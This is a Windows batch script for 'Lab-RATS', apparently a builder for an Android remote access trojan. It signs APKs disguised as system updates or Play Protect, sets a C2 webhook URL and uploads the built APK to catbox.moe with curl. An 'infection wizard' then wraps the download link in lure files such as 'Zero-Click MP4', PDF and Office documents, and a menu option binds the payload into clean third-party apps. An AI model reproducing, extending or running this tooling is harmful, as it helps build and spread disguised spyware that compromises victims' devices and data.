@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1

REM #################################################
REM #                   Lab-RATS                    #
REM #                                               #
REM #        Android APK BUILDER - Windows          #
REM #                v1.5.1 Hardened                #
REM #                                               #
REM #             Developed by: K4N3CO              #
REM #################################################

title Lab-RATS APK Builder v1.5.1 - by K4N3CO

REM Get script directory
set "SCRIPT_DIR=%~dp0"
set "PROJECT_DIR=%SCRIPT_DIR%.."
set "CONFIG_FILE=%SCRIPT_DIR%build_config.txt"

goto :main_menu

:print_banner
cls
echo [96m ┌───────────────────────────────────────────────────────────────────────┐[0m
echo [96m │                                  .-         .                         │[0m
echo [96m │                               ....-        :                          │[0m
echo [96m │                            -==--+:.+. ..  -..+:-+                     │[0m
echo [96m │                            ++---:+.-==+==#:.+---+#                    │[0m
echo [96m │                             :=---:+++++=++=**-:-:                     │[0m
echo [96m │                               --+++:-=+++++++-=                       │[0m
echo [96m │                  .-.         :--+==:++-:-**+-+-                       │[0m
echo [96m │                    -.     .==:--+:+++=++++++++#.                      │[0m
echo [96m │                    :-    =---=::-++.=:.=.-==+....                     │[0m
echo [96m │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │[0m
echo [96m │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │[0m
echo [96m │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │[0m
echo [96m │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │[0m
echo [96m │                .-=:  .---=++++-++++#####*++..::--. .                  │[0m
echo [96m │                 .--++.--:----=+---=-++#++==.       .                  │[0m
echo [96m │                   --------=--:=:-:-====+++-                           │[0m
echo [96m │                       .--++++--++:+++==:=+.                           │[0m
echo [96m │                        .:+++::::--:..:-+=                             │[0m
echo [96m │                       .--=+=-+-+    -:---*---                         │[0m
echo [96m │                                                                       │[0m
echo [96m │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │[0m
echo [96m │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │[0m
echo [96m │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │[0m
echo [96m │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │[0m
echo [96m │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │[0m
echo [96m │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │[0m
echo [96m │                                                                       │[0m
echo [96m │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │[0m
echo [96m │                                                                       │[0m
echo [96m │   The one's who MIND don't matter. The one's who MATTER don't mind.   │[0m
echo [96m │                         DEVELOPED BY K4N3CO                           │[0m
echo [96m │                               © 2026                                  │[0m
echo [96m └───────────────────────────────────────────────────────────────────────┘[0m
echo.
goto :eof

:check_requirements
echo [96m[*] Checking requirements...[0m
echo.
where java >nul 2>nul
if %errorlevel% neq 0 (
    echo [91m[!] Java is not installed.[0m
    exit /b 1
) else (
    echo [92m[✓] Java detected.[0m
)
where keytool >nul 2>nul
if %errorlevel% equ 0 (
    echo [92m[✓] keytool found[0m
)
echo.
goto :eof

:generate_keystore
set "KEYSTORE_PATH=%PROJECT_DIR%\lab-rats-keystore.jks"
set "KEY_ALIAS=lab-rats-key"
set "KEYSTORE_PASS=lab-rats123"
if exist "%KEYSTORE_PATH%" (
    if not "%AUTO_KEYSTORE%"=="1" (
        echo [93m[!] Keystore already exists.[0m
        set /p "REGEN=    Generate new keystore? (y/N): "
        if /i not "!REGEN!"=="y" goto :save_keystore_props
        del /f "%KEYSTORE_PATH%" >nul 2>&1
    ) else (
        goto :save_keystore_props
    )
)

echo [96m[*] Keystore Configuration[0m
if not "%AUTO_KEYSTORE%"=="1" (
    set /p "KEY_ALIAS=    Key alias [lab-rats-key]: "
    if "!KEY_ALIAS!"=="" set "KEY_ALIAS=lab-rats-key"
    set /p "KEYSTORE_PASS=    Password [lab-rats123]: "
    if "!KEYSTORE_PASS!"=="" set "KEYSTORE_PASS=lab-rats123"
)

keytool -genkeypair -alias "!KEY_ALIAS!" -keyalg RSA -keysize 2048 -validity 9125 -keystore "%KEYSTORE_PATH%" -storepass "!KEYSTORE_PASS!" -keypass "!KEYSTORE_PASS!" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" >nul 2>&1
echo [92m[✓] Keystore generated[0m

:save_keystore_props
(
    echo storeFile=lab-rats-keystore.jks
    echo storePassword=!KEYSTORE_PASS!
    echo keyAlias=!KEY_ALIAS!
    echo keyPassword=!KEYSTORE_PASS!
) > "%PROJECT_DIR%\keystore.properties"
goto :eof

:configure_app
echo [96m[*] App Configuration[0m
set /p "APP_NAME=    Enter App Name [System Stability Service]: "
if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"
set /p "PKG_NAME=    Enter Package ID [com.android.system.stability]: "
if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"
set /p "VERSION_NAME=    Enter Version Name [1.0.0]: "
if "!VERSION_NAME!"=="" set "VERSION_NAME=1.0.0"
set /p "MIN_SDK=    Enter Min SDK [21]: "
if "!MIN_SDK!"=="" set "MIN_SDK=21"

echo.
echo [96m[*] Decoy Identity Selection[0m
echo     1. System Update (Gear)  2. Calculator
echo     3. Weather               4. Play Protect
echo     5. Lab-RATS Logo
set /p "DECOY_CHOICE=    Choice (Default 1): "
if "!DECOY_CHOICE!"=="" set "DECOY_CHOICE=1"

set /p "WEB_URL=    Enter C2 Webhook URL [Press Enter to Keep Current]: "
if not "!WEB_URL!"=="" (
    powershell -Command "$p = Get-Content '%PROJECT_DIR%\local.properties' -ErrorAction SilentlyContinue; $p = $p -notmatch 'WEBHOOK_URL='; $p += 'WEBHOOK_URL=!WEB_URL!'; Set-Content '%PROJECT_DIR%\local.properties' $p"
)
powershell -Command "$p = Get-Content '%PROJECT_DIR%\local.properties' -ErrorAction SilentlyContinue; $p = $p -notmatch 'DECOY_CHOICE='; $p += 'DECOY_CHOICE=!DECOY_CHOICE!'; Set-Content '%PROJECT_DIR%\local.properties' $p"

goto :eof

:build_apk
cd /d "%PROJECT_DIR%"
echo [96m[*] Compiling Resources & Signing (Gradle)...[0m
call gradlew.bat clean assembleRelease --no-daemon
if exist "app\build\outputs\apk\release\app-release.apk" (
    if not exist "%SCRIPT_DIR%output" mkdir "%SCRIPT_DIR%output"
    copy /Y "app\build\outputs\apk\release\app-release.apk" "%SCRIPT_DIR%output\signed_v1.apk" >nul
    echo [92m[✓] Success: apk-builder\output\signed_v1.apk[0m
) else (
    echo [91m[!] BUILD FAILED. Check console output above.[0m
    pause
)
cd /d "%SCRIPT_DIR%"
goto :eof

:infection_wizard
call :print_banner
echo [91m[>] STRATEGIC_INFECTION_WIZARD[0m
call :check_requirements
set "AUTO_KEYSTORE=1"
call :generate_keystore
call :configure_app
call :build_apk
if not exist "output\signed_v1.apk" goto :main_menu
echo [93m[*] Uploading to Catbox.moe...[0m
powershell -Command "$resp = curl.exe -sS -F 'reqtype=fileupload' -F 'fileToUpload=@output\signed_v1.apk' https://catbox.moe/user/api.php; Set-Content -Path temp_url.txt -Value $resp"
set /p DOWNLOAD_URL=<temp_url.txt
del temp_url.txt
echo [92m[✓] Hosted: !DOWNLOAD_URL![0m
echo      1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite
echo      4. Dolby Audio     5. ADB Script    6. Bluetooth Push
echo      7. NFC NDEF Tag    8. Stego Image   9. PWA Bundle
echo      10. Office Word    11. Office Excel 12. Ghost GIF
set /p "VECTOR=      Choice: "
if "!VECTOR!"=="1" ( set "V=mp4" ) else if "!VECTOR!"=="2" ( set "V=pdf" ) else if "!VECTOR!"=="3" ( set "V=ics" ) else if "!VECTOR!"=="4" ( set "V=dolby" ) else if "!VECTOR!"=="5" ( set "V=adb" ) else if "!VECTOR!"=="6" ( set "V=vcf" ) else if "!VECTOR!"=="7" ( set "V=ndef" ) else if "!VECTOR!"=="8" ( set "V=stego" ) else if "!VECTOR!"=="9" ( set "V=pwa" ) else if "!VECTOR!"=="10" ( set "V=docx" ) else if "!VECTOR!"=="11" ( set "V=xlsx" ) else ( set "V=gif" )
call :generate_exploit_standalone "!V!" "!DOWNLOAD_URL!" "System_Update"
pause
goto :main_menu

:exploit_menu
call :print_banner
echo [95m[>] Weaponized Payload Lab (Hardened Tier)[0m
echo     1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite
echo     4. Dolby Audio       5. ADB Script      6. Bluetooth Push
echo     7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle
echo     10. Office Word      11. Office Excel   12. Ghost GIF
echo     13. Priv-App Magisk Module ZIP
echo     14. Return to Main Menu
set /p "EXPLOIT_CHOICE=    Choice: "
if "!EXPLOIT_CHOICE!"=="13" call :generate_exploit_standalone "privapp" "http://127.0.0.1:8080"
if "!EXPLOIT_CHOICE!"=="14" goto :main_menu
call :generate_exploit_standalone "pdf" "http://127.0.0.1:8080" "Security_Audit"
pause
goto :main_menu

:generate_exploit_standalone
set "TYPE=%~1"
set "URL=%~2"
set "EXTRA=%~3"
set "EXPLOIT_SRC=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
set "TEMP_BIN=%SCRIPT_DIR%bin"
if not exist "%TEMP_BIN%" mkdir "%TEMP_BIN%"
javac -sourcepath "%PROJECT_DIR%\app\src\main\java" -d "%TEMP_BIN%" "%EXPLOIT_SRC%" >nul 2>&1
if %errorlevel% equ 0 (
    cd /d "%SCRIPT_DIR%output"
    java -cp "%TEMP_BIN%" com.labs.labrats.exploits.ExploitLab "%TYPE%" "%URL%" "%EXTRA%"
    cd /d "%SCRIPT_DIR%"
) else (
    echo [91m[!] Exploit compilation failed.[0m
)
goto :eof

:show_help
call :print_banner
echo COMMAND_DOCUMENTATION_V1.5.1
echo ------------------------------------------------------------
echo 1. Start Build: Standard production flow.
echo 2. Keystore Only: Unique signing certificate.
echo 3. App Settings: Change ID, Name, and Version.
echo 4. Requirements: Check Java setup.
echo 5. Exploit Lab: Generate standalone tactical vectors.
echo 6. Infection Wizard: Full Build -^> Host -^> Weaponize.
echo 7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK.
echo ------------------------------------------------------------
pause
goto :main_menu

:main_menu
call :print_banner
echo [91m[>] Build Options:[0m
echo.
echo     1. Start Build (Configure & Build)
echo     2. Generate Keystore Only
echo     3. Configure App Settings Only
echo     4. Check Requirements
echo     5. Weaponized Payload Lab
echo     6. Generate Infection Chain Package (Wizard)
echo     7. Smali Surgery & APK Binder (Infect Clean APK)
echo     8. Help / Documentation
echo     9. Exit
echo.
set /p "MENU_OPTION=    Choice (Default 1): "
if "!MENU_OPTION!"=="1" ( call :check_requirements && call :generate_keystore && call :configure_app && call :build_apk )
if "!MENU_OPTION!"=="2" ( call :check_requirements && call :generate_keystore )
if "!MENU_OPTION!"=="3" ( call :configure_app )
if "!MENU_OPTION!"=="4" ( call :check_requirements && pause )
if "!MENU_OPTION!"=="5" ( call :exploit_menu )
if "!MENU_OPTION!"=="6" ( call :infection_wizard )
if "!MENU_OPTION!"=="7" ( powershell -ExecutionPolicy Bypass -File "%SCRIPT_DIR%bind.ps1" && pause )
if "!MENU_OPTION!"=="8" ( call :show_help )
if "!MENU_OPTION!"=="9" ( exit /b 0 )
goto :main_menu
